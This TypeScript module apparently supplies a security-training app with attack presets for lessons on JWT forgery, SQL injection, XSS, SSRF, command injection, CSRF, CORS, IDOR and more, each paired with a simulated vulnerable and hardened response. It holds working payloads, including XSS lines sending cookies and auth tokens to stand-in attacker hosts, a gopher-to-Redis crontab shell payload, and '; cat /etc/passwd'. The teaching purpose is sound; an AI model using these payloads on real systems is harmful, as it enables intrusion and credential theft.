export interface AttackPreset {
  id: string;
  name: string;
  category: string;
  description: string;
  payload: string;
  method: 'GET' | 'POST' | 'PUT' | 'DELETE' | 'PATCH' | 'OPTIONS' | 'HEAD';
  endpoint: string;
  headers: Record<string, string>;
  vulnerableResponse: {
    status: number;
    statusText: string;
    body: string;
    headers: Record<string, string>;
    exploitTrace: string;
  };
  armoredResponse: {
    status: number;
    statusText: string;
    body: string;
    headers: Record<string, string>;
    defenseRule: string;
  };
}

export interface LessonAttackData {
  lessonId: string;
  presets: AttackPreset[];
  defaultPayload: string;
}

export const ATTACK_PAYLOADS_BY_LESSON: Record<string, LessonAttackData> = {
  'oauth-pkce': {
    lessonId: 'oauth-pkce',
    defaultPayload: 'grant_type=authorization_code&code=splat_9f82&client_id=spa_app',
    presets: [
      {
        id: 'pkce-missing-verifier',
        name: 'Authorization Code Interception (No PKCE Verifier)',
        category: 'Auth Hijack',
        description:
          'Attacker intercepts the authorization code via custom URI scheme and attempts token exchange without providing the secret code_verifier.',
        payload:
          'grant_type=authorization_code&code=splat_auth_code_intercepted_8821&client_id=spa_app&redirect_uri=com.bank.app://oauth',
        method: 'POST',
        endpoint: '/oauth/v2/token',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        vulnerableResponse: {
          status: 200,
          statusText: 'OK (Vulnerable OAuth 2.0 without PKCE)',
          body: JSON.stringify(
            {
              access_token:
                'eyJhGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzg4MjEiLCJyb2xlIjoidmljdGltX3VzZXIifQ.fake_signature',
              token_type: 'Bearer',
              expires_in: 3600,
              scope: 'read write accounts transfer',
            },
            null,
            2
          ),
          headers: { 'Content-Type': 'application/json' },
          exploitTrace:
            'CRITICAL: Token endpoint accepted authorization code without validating code_verifier! Attacker gained full API session.',
        },
        armoredResponse: {
          status: 400,
          statusText: 'Bad Request',
          body: JSON.stringify(
            {
              error: 'invalid_grant',
              error_description:
                'PKCE verification failed: code_verifier parameter missing or does not match SHA-256 code_challenge',
            },
            null,
            2
          ),
          headers: { 'Content-Type': 'application/json' },
          defenseRule:
            'RFC 7636 Section 4.6: Authorization server computed SHA256(code_verifier) and verified against registered code_challenge.',
        },
      },
      {
        id: 'pkce-state-tampering',
        name: 'Cross-Site Auth Code Injection (State Stripped)',
        category: 'CSRF/Injection',
        description:
          'Attacker tricks victim browser into redeeming an authorization code tied to attacker account by stripping or tampering with state parameter.',
        payload: 'code=attacker_preseeded_code_4412&state=tampered_or_missing',
        method: 'GET',
        endpoint: '/oauth/callback?code=attacker_preseeded_code_4412',
        headers: { Host: 'client.production.app' },
        vulnerableResponse: {
          status: 200,
          statusText: 'OK - Session Linked to Attacker Account',
          body: '{"message": "Login successful. Session established under attacker identity."}',
          headers: { 'Set-Cookie': 'session=attacker_uid_9912; Path=/' },
          exploitTrace:
            'CSRF EXPLOIT: Client application linked local browser session to attacker account without validating cryptographic state nonce.',
        },
        armoredResponse: {
          status: 403,
          statusText: 'Forbidden - CSRF State Mismatch',
          body: '{"error": "state_mismatch", "message": "Cryptographic CSRF state token missing or invalid."}',
          headers: { 'Content-Type': 'application/json' },
          defenseRule:
            'RFC 6749 Section 10.12: Strict state nonce verification in secure HttpOnly cookie storage.',
        },
      },
    ],
  },
  'jwt-tampering': {
    lessonId: 'jwt-tampering',
    defaultPayload:
      '{"alg": "none", "typ": "JWT"}.{"sub": "admin", "role": "superadmin", "iat": 1700000000}.',
    presets: [
      {
        id: 'jwt-alg-none',
        name: 'Algorithm Confusion ("alg": "none")',
        category: 'Token Forgery',
        description:
          'Token header rewritten to specify alg: "none", completely stripping cryptographic signature validation.',
        payload:
          'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMCwicm9sZSI6InN1cGVyYWRtaW4iLCJwZXJtcyI6WyJhbGwiXX0.',
        method: 'GET',
        endpoint: '/api/v1/admin/vault',
        headers: {
          Authorization:
            'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMCwicm9sZSI6InN1cGVyYWRtaW4iLCJwZXJtcyI6WyJhbGwiXX0.',
        },
        vulnerableResponse: {
          status: 200,
          statusText: 'OK - Superadmin Granted',
          body: JSON.stringify(
            {
              status: 'success',
              privileges: 'ALL',
              system_secrets: ['KMS_KEY_AWS_0192', 'DB_PROD_PASSWORD_R00T', 'STRIPE_LIVE_KEY_9921'],
            },
            null,
            2
          ),
          headers: { 'Content-Type': 'application/json' },
          exploitTrace:
            'VULNERABILITY: Backend JWT parser blindly trusted header "alg": "none" and bypassed signature check!',
        },
        armoredResponse: {
          status: 401,
          statusText: 'Unauthorized - Insecure Algorithm Rejected',
          body: JSON.stringify(
            {
              error: 'invalid_token',
              message:
                'Unsecured JWTs (alg=none) are strictly rejected by policy. Algorithm must match RS256 / EdDSA.',
            },
            null,
            2
          ),
          headers: { 'WWW-Authenticate': 'Bearer error="invalid_token"' },
          defenseRule:
            'RFC 7519 Best Practice: Explicit whitelist of accepted cryptographic signing algorithms.',
        },
      },
      {
        id: 'jwt-hmac-rsa-confusion',
        name: 'HMAC / RSA Public Key Confusion',
        category: 'Signature Forgery',
        description:
          'Server expects RS256 with an RSA public key; attacker signs token with HS256 using the publicly readable RSA public key as HMAC secret.',
        payload:
          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb290X2FkbWluIiwiZXhwIjoyMDAwMDAwMDAwfQ.HMAC_SIGNED_WITH_PUBLIC_PEM',
        method: 'POST',
        endpoint: '/api/v1/cluster/reboot',
        headers: { Authorization: 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...' },
        vulnerableResponse: {
          status: 200,
          statusText: 'OK - Cluster Reboot Executed',
          body: '{"message": "Command executed: cluster reboot initiated by root_admin."}',
          headers: { 'Content-Type': 'application/json' },
          exploitTrace:
            'CRITICAL: RSA public key string was interpreted as symmetric HMAC secret key.',
        },
        armoredResponse: {
          status: 401,
          statusText: 'Unauthorized',
          body: '{"error": "asymmetric_key_mismatch", "message": "Expected RS256 asymmetric signature. HS256 forbidden."}',
          headers: { 'Content-Type': 'application/json' },
          defenseRule:
            'Strict algorithm enforcement prevents asymmetric-to-symmetric key confusion.',
        },
      },
    ],
  },
  'sql-injection': {
    lessonId: 'sql-injection',
    defaultPayload: "' OR 1=1 --",
    presets: [
      {
        id: 'sqli-auth-bypass',
        name: 'Classic Tautology Authentication Bypass',
        category: 'Auth Bypass',
        description:
          'Injects boolean tautology into SQL WHERE clause to bypass password authentication.',
        payload: "admin' OR 1=1 --",
        method: 'POST',
        endpoint: '/api/v1/auth/login',
        headers: { 'Content-Type': 'application/json' },
        vulnerableResponse: {
          status: 200,
          statusText: 'OK - Authenticated as Administrator',
          body: JSON.stringify(
            {
              session_token: 'sess_99182371928312',
              user: { id: 1, username: 'admin', role: 'DBA_SUPERADMIN' },
            },
            null,
            2
          ),
          headers: { 'Set-Cookie': 'session=sess_99182371928312; Path=/' },
          exploitTrace:
            "SQL EXECUTED: SELECT * FROM users WHERE username = 'admin' OR 1=1 --' AND password_hash = '...' -> 1 row returned!",
        },
        armoredResponse: {
          status: 401,
          statusText: 'Unauthorized',
          body: JSON.stringify(
            {
              error: 'invalid_credentials',
              message: 'Invalid username or password supplied.',
            },
            null,
            2
          ),
          headers: { 'Content-Type': 'application/json' },
          defenseRule:
            'Parameterized Prepared Statement: Input passed as raw string literal via $1 parameter placeholder.',
        },
      },
      {
        id: 'sqli-union-dump',
        name: 'UNION SELECT Credential Exfiltration',
        category: 'Data Exfiltration',
        description:
          'Appends UNION SELECT to extract username and bcrypt password hashes from internal credentials table.',
        payload: "' UNION SELECT null, username, password_hash FROM admin_users --",
        method: 'GET',
        endpoint:
          "/api/v1/products?search=' UNION SELECT null, username, password_hash FROM admin_users --",
        headers: { Accept: 'application/json' },
        vulnerableResponse: {
          status: 200,
          statusText: 'OK',
          body: JSON.stringify(
            {
              results: [
                {
                  id: null,
                  title: 'admin',
                  description: '$2b$12$e9qO21kU9qX80.1iA4K8uO77L2wA21kU9qX80.1iA4K8uO',
                },
                {
                  id: null,
                  title: 'ciso',
                  description: '$2b$12$K198aLmPq2wZ7u.992LmPq2wZ7uK198aLmPq2wZ7u992Lm',
                },
              ],
            },
            null,
            2
          ),
          headers: { 'Content-Type': 'application/json' },
          exploitTrace:
            'UNION SQL INJECTION: Extracted 2 hashed administrative credentials into public product response body.',
        },
        armoredResponse: {
          status: 200,
          statusText: 'OK (Empty Search Results)',
          body: JSON.stringify({ results: [] }, null, 2),
          headers: { 'Content-Type': 'application/json' },
          defenseRule:
            'Prepared statement query parameterized: SELECT * FROM products WHERE title ILIKE $1',
        },
      },
    ],
  },
  'xss-csp': {
    lessonId: 'xss-csp',
    defaultPayload: '<script>fetch("https://attacker.site/leak?c="+document.cookie)</script>',
    presets: [
      {
        id: 'xss-cookie-steal',
        name: 'Stored Script Injection (Cookie Exfiltration)',
        category: 'Data Exfiltration',
        description:
          'Injects unescaped inline script executing in victim DOM context to harvest document.cookie and exfiltrate over HTTP.',
        payload:
          '<script>fetch("https://attacker.com/leak?cookie="+encodeURIComponent(document.cookie))</script>',
        method: 'POST',
        endpoint: '/api/v1/comments',
        headers: { 'Content-Type': 'application/json' },
        vulnerableResponse: {
          status: 200,
          statusText: 'OK (Comment Rendered Raw)',
          body: '<div class="comment"><script>fetch("https://attacker.com/leak?cookie="+encodeURIComponent(document.cookie))</script></div>',
          headers: { 'Content-Type': 'text/html' },
          exploitTrace:
            'DOM EXECUTION: Inline script executed without CSP restrictions. Cookie sent to attacker C2.',
        },
        armoredResponse: {
          status: 200,
          statusText: 'OK (Armored with CSP & Entity Encoding)',
          body: '<div class="comment">&lt;script&gt;fetch(&quot;...&quot;)&lt;/script&gt;</div>',
          headers: {
            'Content-Type': 'text/html',
            'Content-Security-Policy':
              "default-src 'self'; script-src 'self' 'nonce-rAnd0m123'; object-src 'none';",
          },
          defenseRule:
            "CSP Level 3 Block: Refused to execute inline script because it violates directive 'script-src'. HTML encoded.",
        },
      },
      {
        id: 'xss-svg-onerror',
        name: 'Polymorphic Event Handler Bypass (<svg onload=...>)',
        category: 'Filter Evasion',
        description: 'Uses vector image onload handler to bypass naive regex tag strippers.',
        payload: '<svg/onload=fetch("//c2.hax/"+localStorage.getItem("authToken"))>',
        method: 'POST',
        endpoint: '/api/v1/profile/bio',
        headers: { 'Content-Type': 'application/json' },
        vulnerableResponse: {
          status: 200,
          statusText: 'OK',
          body: '<div class="bio"><svg/onload=fetch("//c2.hax/"+localStorage.getItem("authToken"))></div>',
          headers: { 'Content-Type': 'text/html' },
          exploitTrace:
            'EVENT EXECUTION: SVG onload fired immediately in victim browser. LocalStorage auth token leaked.',
        },
        armoredResponse: {
          status: 200,
          statusText: 'OK',
          body: '<div class="bio">&lt;svg/onload=...&gt;</div>',
          headers: {
            'Content-Type': 'text/html',
            'Content-Security-Policy': "default-src 'self'; script-src 'self' 'strict-dynamic';",
          },
          defenseRule:
            'Context-aware DOMPurify sanitization + CSP blocked inline event handler execution.',
        },
      },
    ],
  },
  'ssrf-cloud-metadata': {
    lessonId: 'ssrf-cloud-metadata',
    defaultPayload:
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/production-role',
    presets: [
      {
        id: 'ssrf-imds-v1',
        name: 'AWS EC2 IMDSv1 Metadata IAM Role Exfiltration',
        category: 'Cloud Breach',
        description:
          'Forces web server image proxy or webhook engine to fetch link-local IP 169.254.169.254, dumping temporary AWS STS IAM credentials.',
        payload:
          'http://169.254.169.254/latest/meta-data/iam/security-credentials/production-cluster-role',
        method: 'POST',
        endpoint: '/api/v1/render-pdf-from-url',
        headers: { 'Content-Type': 'application/json' },
        vulnerableResponse: {
          status: 200,
          statusText: 'OK - Cloud Credentials Dumped',
          body: JSON.stringify(
            {
              Code: 'Success',
              Type: 'AWS-HMAC',
              AccessKeyId: 'ASIAIOSFODNN7EXAMPLE',
              SecretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
              Token: 'AQoDYXdzEJr1...EXAMPLESTSTOKEN...',
              Expiration: '2026-11-20T18:00:00Z',
            },
            null,
            2
          ),
          headers: { 'Content-Type': 'application/json' },
          exploitTrace:
            'CLOUD COMPROMISE: Internal HTTP client queried IMDSv1 directly without token header. Attacker acquired AWS admin credentials.',
        },
        armoredResponse: {
          status: 403,
          statusText: 'Forbidden - SSRF Protection Enforced',
          body: JSON.stringify(
            {
              error: 'ssrf_blocked',
              message:
                'Target address 169.254.169.254 resolves to a link-local/private subnet (RFC 3927). External requests only.',
            },
            null,
            2
          ),
          headers: { 'Content-Type': 'application/json' },
          defenseRule:
            'Pre-flight DNS & IP pinning against private CIDRs (169.254/16, 10/8, 172.16/12, 127/8) + IMDSv2 Hop Limit 1.',
        },
      },
      {
        id: 'ssrf-gopher-redis',
        name: 'Gopher Protocol SSRF -> Internal Redis RCE',
        category: 'Protocol Smuggling',
        description:
          'Smuggles raw TCP commands via gopher:// URI scheme to talk to internal Redis instance on port 6379.',
        payload:
          'gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/spool/cron%0ACONFIG%20SET%20dbfilename%20root%0ASET%20crontab%20"*%20*%20*%20*%20*%20/bin/sh%20-i"%0ASAVE',
        method: 'POST',
        endpoint: '/api/v1/fetch-avatar',
        headers: { 'Content-Type': 'application/json' },
        vulnerableResponse: {
          status: 200,
          statusText: 'OK - Redis Commands Smuggled',
          body: '+OK\n+OK\n+OK\n+OK',
          headers: { 'Content-Type': 'text/plain' },
          exploitTrace:
            'REMOTE CODE EXECUTION: Internal Redis instance executed crontab overwrite commands from unvalidated URI scheme.',
        },
        armoredResponse: {
          status: 400,
          statusText: 'Bad Request - Protocol Prohibited',
          body: '{"error": "invalid_scheme", "message": "Only HTTPS protocol is permitted for outbound HTTP fetching."}',
          headers: { 'Content-Type': 'application/json' },
          defenseRule:
            'Strict scheme allowlist (HTTPS only); Gopher/File/FTP/DICT protocols rejected at network layer.',
        },
      },
    ],
  },
  'rate-limiting-ddos': {
    lessonId: 'rate-limiting-ddos',
    defaultPayload: 'BURST_ATTACK: 1000 requests in 100ms from 198.51.100.42',
    presets: [
      {
        id: 'rate-limit-burst',
        name: 'L7 Distributed Token Bucket Flood (5,000 req/s)',
        category: 'Denial of Service',
        description:
          'Simulates high-velocity burst of concurrent requests to overwhelm backend database connection pools.',
        payload: 'CONCURRENT_BATCH: 5000_REQUESTS_BURST',
        method: 'POST',
        endpoint: '/api/v1/expensive-report-generate',
        headers: { 'X-Forwarded-For': '198.51.100.42' },
        vulnerableResponse: {
          status: 500,
          statusText: 'Internal Server Error - DB Connection Pool Exhausted',
          body: '{"error": "pq: too many clients already", "latency_ms": 14200}',
          headers: { 'Content-Type': 'application/json' },
          exploitTrace:
            'DENIAL OF SERVICE: Server processed all 5,000 requests without rate limiting. Backend crashed.',
        },
        armoredResponse: {
          status: 429,
          statusText: 'Too Many Requests',
          body: JSON.stringify(
            {
              error: 'rate_limit_exceeded',
              message: 'You have exceeded your quota of 60 requests per minute.',
              retry_after_seconds: 45,
            },
            null,
            2
          ),
          headers: {
            'Content-Type': 'application/json',
            'Retry-After': '45',
            'X-RateLimit-Limit': '60',
            'X-RateLimit-Remaining': '0',
            'X-RateLimit-Reset': '1700000045',
          },
          defenseRule:
            'Redis sliding-window rate limiter triggered. Excess requests discarded at reverse-proxy boundary.',
        },
      },
    ],
  },
  'command-injection': {
    lessonId: 'command-injection',
    defaultPayload: '; cat /etc/passwd',
    presets: [
      {
        id: 'cmd-etc-passwd',
        name: 'Shell Metacharacter Chaining (; cat /etc/passwd)',
        category: 'RCE',
        description:
          'Injects semicolon into system ping or traceroute command to execute arbitrary shell commands under web user privileges.',
        payload: '127.0.0.1; cat /etc/passwd',
        method: 'POST',
        endpoint: '/api/v1/network/ping',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        vulnerableResponse: {
          status: 200,
          statusText: 'OK',
          body: 'PING 127.0.0.1 (127.0.0.1): 56 data bytes\n64 bytes from 127.0.0.1...\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/bin/sh',
          headers: { 'Content-Type': 'text/plain' },
          exploitTrace:
            'COMMAND EXECUTION: Input passed directly to child_process.exec("ping -c 1 " + ip) without sanitation.',
        },
        armoredResponse: {
          status: 400,
          statusText: 'Bad Request - Invalid IP Format',
          body: '{"error": "validation_error", "message": "Input does not match standard IPv4/IPv6 regex."}',
          headers: { 'Content-Type': 'application/json' },
          defenseRule:
            'Strict input whitelist validation (inet_pton) + execFile() with discrete array arguments.',
        },
      },
    ],
  },
  'cors-preflight': {
    lessonId: 'cors-preflight',
    defaultPayload: 'Origin: https://evil-tracker.io, Access-Control-Request-Method: POST',
    presets: [
      {
        id: 'cors-wildcard-creds',
        name: 'Reflected Origin with Credentials Allowed',
        category: 'Origin Bypass',
        description:
          'Attacker site initiates cross-origin request; vulnerable server reflects Origin header alongside Access-Control-Allow-Credentials: true.',
        payload: 'Origin: https://attacker-portal.org',
        method: 'OPTIONS',
        endpoint: '/api/v1/banking/statements',
        headers: {
          Origin: 'https://attacker-portal.org',
          'Access-Control-Request-Method': 'GET',
          'Access-Control-Request-Headers': 'Authorization',
        },
        vulnerableResponse: {
          status: 200,
          statusText: 'OK',
          body: '',
          headers: {
            'Access-Control-Allow-Origin': 'https://attacker-portal.org',
            'Access-Control-Allow-Credentials': 'true',
            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
          },
          exploitTrace:
            'CORS BYPASS: Browser allows attacker javascript to read private banking statements with victim cookies!',
        },
        armoredResponse: {
          status: 403,
          statusText: 'Forbidden - Origin Not Allowed',
          body: '{"error": "cors_prohibited", "message": "Disallowed cross-origin origin header."}',
          headers: { 'Content-Type': 'application/json' },
          defenseRule: 'Strict static whitelist check against verified company domain names only.',
        },
      },
    ],
  },
  'csrf-defense': {
    lessonId: 'csrf-defense',
    defaultPayload:
      '<form action="https://bank.com/transfer" method="POST"><input name="to" value="attacker"><input name="amount" value="5000"></form><script>document.forms[0].submit()</script>',
    presets: [
      {
        id: 'csrf-transfer',
        name: 'Cross-Site Form Auto-Submit (Missing Anti-CSRF Token)',
        category: 'Session Hijack',
        description:
          'Malicious site hosts hidden form targeting authenticated banking endpoint without requiring cryptographic anti-CSRF token.',
        payload:
          'POST /transfer recipient=attacker_iban_9918&amount=5000 (Cookie: session=active_bank_user)',
        method: 'POST',
        endpoint: '/api/v1/funds/transfer',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          Referer: 'https://evil-clickbait-site.com',
        },
        vulnerableResponse: {
          status: 200,
          statusText: 'OK - Funds Transferred',
          body: '{"status": "transferred", "recipient": "attacker_iban_9918", "amount": 5000}',
          headers: { 'Content-Type': 'application/json' },
          exploitTrace:
            'CSRF SUCCESS: Ambient cookies automatically attached by browser. Wire transfer executed without victim intent.',
        },
        armoredResponse: {
          status: 403,
          statusText: 'Forbidden - Anti-CSRF Validation Failed',
          body: '{"error": "csrf_token_missing", "message": "Missing or mismatched X-CSRF-Token header."}',
          headers: { 'Content-Type': 'application/json' },
          defenseRule:
            'Cryptographic Synchronizer Token Pattern + SameSite=Strict / Lax cookie protection.',
        },
      },
    ],
  },
  'idor-bola': {
    lessonId: 'idor-bola',
    defaultPayload: 'GET /api/v1/documents/1004 (User is owner of 1001)',
    presets: [
      {
        id: 'idor-user-increment',
        name: 'Horizontal Privilege Escalation (Object ID Increment)',
        category: 'Broken Object Level Auth',
        description:
          'User alters numeric resource ID in URI parameter to read medical or financial records belonging to another tenant.',
        payload: 'GET /api/v1/medical-records/patient_id=4492',
        method: 'GET',
        endpoint: '/api/v1/medical-records/patient_id=4492',
        headers: { Authorization: 'Bearer user_token_for_id_1001' },
        vulnerableResponse: {
          status: 200,
          statusText: 'OK - Record Retrieved',
          body: JSON.stringify(
            {
              record_id: 4492,
              patient_name: 'Jane Doe',
              diagnosis: 'Confidential Medical File 99-A',
              ssn: '***-**-8812',
            },
            null,
            2
          ),
          headers: { 'Content-Type': 'application/json' },
          exploitTrace:
            'IDOR BREACH: Endpoint validated that requester was logged in, but never verified ownership of record 4492!',
        },
        armoredResponse: {
          status: 403,
          statusText: 'Forbidden - Access Denied to Resource',
          body: '{"error": "unauthorized_resource", "message": "Authenticated user is not authorized to access record 4492."}',
          headers: { 'Content-Type': 'application/json' },
          defenseRule:
            'Object-level authorization check: WHERE record_id = $1 AND tenant_id = $2 (or UUIDv4 unguessable tokens).',
        },
      },
    ],
  },
  'prototype-pollution': {
    lessonId: 'prototype-pollution',
    defaultPayload: '{"__proto__": {"isAdmin": true, "status": "authorized"}}',
    presets: [
      {
        id: 'proto-pollute-admin',
        name: 'Recursive Deep Merge Object Prototype Pollution',
        category: 'Logic Flaw',
        description:
          'Supplies JSON containing __proto__ key to an unsanitized deep merge utility, injecting isAdmin property across all Javascript objects.',
        payload: '{"user": {"name": "guest"}, "__proto__": {"isAdmin": true, "canDelete": true}}',
        method: 'POST',
        endpoint: '/api/v1/users/profile',
        headers: { 'Content-Type': 'application/json' },
        vulnerableResponse: {
          status: 200,
          statusText: 'OK',
          body: '{"message": "Profile updated. Object.prototype.isAdmin is now true globally across all runtime scopes."}',
          headers: { 'Content-Type': 'application/json' },
          exploitTrace:
            'PROTOTYPE POLLUTION: ({}).isAdmin evaluates to true. Attacker escalated to admin without database modification.',
        },
        armoredResponse: {
          status: 400,
          statusText: 'Bad Request - Prohibited Prototype Key',
          body: '{"error": "prototype_pollution_detected", "message": "Key __proto__ or constructor is strictly disallowed."}',
          headers: { 'Content-Type': 'application/json' },
          defenseRule:
            'Object.freeze(Object.prototype) or Map / Object.create(null) dictionary without prototype inheritance.',
        },
      },
    ],
  },
  'password-hashing': {
    lessonId: 'password-hashing',
    defaultPayload: 'PASSWORD: "password123", HASH: "482c811da5d5b4bc6d497ffa98491e38" (MD5)',
    presets: [
      {
        id: 'pwd-md5-rainbow',
        name: 'Fast Rainbow Table Collision Lookup against Unsalted MD5',
        category: 'Weak Cryptography',
        description:
          'Attacker queries pre-computed rainbow table for MD5 hash 482c811da5d5b4bc6d497ffa98491e38, finding plaintext in under 2 milliseconds.',
        payload: 'QUERY_RAINBOW_TABLE: 482c811da5d5b4bc6d497ffa98491e38',
        method: 'POST',
        endpoint: '/tools/rainbow-lookup',
        headers: { 'Content-Type': 'application/json' },
        vulnerableResponse: {
          status: 200,
          statusText: 'OK - Hash Cracked',
          body: JSON.stringify(
            {
              algorithm: 'MD5 (Unsalted)',
              plaintext: 'password123',
              time_taken: '0.0018s',
              hashes_per_second: '25,000,000,000 H/s',
            },
            null,
            2
          ),
          headers: { 'Content-Type': 'application/json' },
          exploitTrace:
            'WEAK CIPHER: MD5 lacks salt and work factor. Crack completed instantaneously via GPU/Rainbow tables.',
        },
        armoredResponse: {
          status: 200,
          statusText: 'OK - Hash Infeasible to Crack',
          body: JSON.stringify(
            {
              algorithm: 'Argon2id (m=65536, t=3, p=4)',
              salt: 'e9a8f7b6c5d4e3f2...',
              estimated_crack_time_4090_rig: '14,200 years',
            },
            null,
            2
          ),
          headers: { 'Content-Type': 'application/json' },
          defenseRule:
            'Argon2id Memory-Hard Cryptographic Hash Function with 128-bit unique salt and 64MB RAM hardness.',
        },
      },
    ],
  },
};

export const getLessonAttackData = (lessonId: string): LessonAttackData => {
  if (ATTACK_PAYLOADS_BY_LESSON[lessonId]) {
    return ATTACK_PAYLOADS_BY_LESSON[lessonId];
  }

  // Fallback generic attack preset for other lessons
  return {
    lessonId,
    defaultPayload: `EXPLOIT_PAYLOAD_TEST: ${lessonId}`,
    presets: [
      {
        id: `${lessonId}-vector-probe`,
        name: 'Generic Attack Vector Probe',
        category: 'Threat Exploration',
        description: `Simulates standard threat payload against ${lessonId} subsystem.`,
        payload: `ATTACK_VECTOR_PROBE_INPUT: target=${lessonId}&exploit=standard_payload`,
        method: 'POST',
        endpoint: `/api/v1/security/${lessonId}/test`,
        headers: { 'Content-Type': 'application/json' },
        vulnerableResponse: {
          status: 200,
          statusText: 'OK (Vulnerable Logic Reached)',
          body: JSON.stringify(
            {
              status: 'vulnerable',
              message: `Subsystem ${lessonId} accepted unvalidated input and exposed internal state.`,
              tampered: true,
            },
            null,
            2
          ),
          headers: { 'Content-Type': 'application/json' },
          exploitTrace: `EXPLOIT TRIGGERED: State machine executed unverified payload on ${lessonId}.`,
        },
        armoredResponse: {
          status: 403,
          statusText: 'Forbidden - Security Policy Intercepted',
          body: JSON.stringify(
            {
              status: 'blocked',
              rule: `${lessonId.toUpperCase()}_DEFENSE_ACTIVE`,
              message: 'Input rejected by defense layer.',
            },
            null,
            2
          ),
          headers: { 'Content-Type': 'application/json' },
          defenseRule: `Active architectural mitigation prevented unauthorized exploit on ${lessonId}.`,
        },
      },
    ],
  };
};
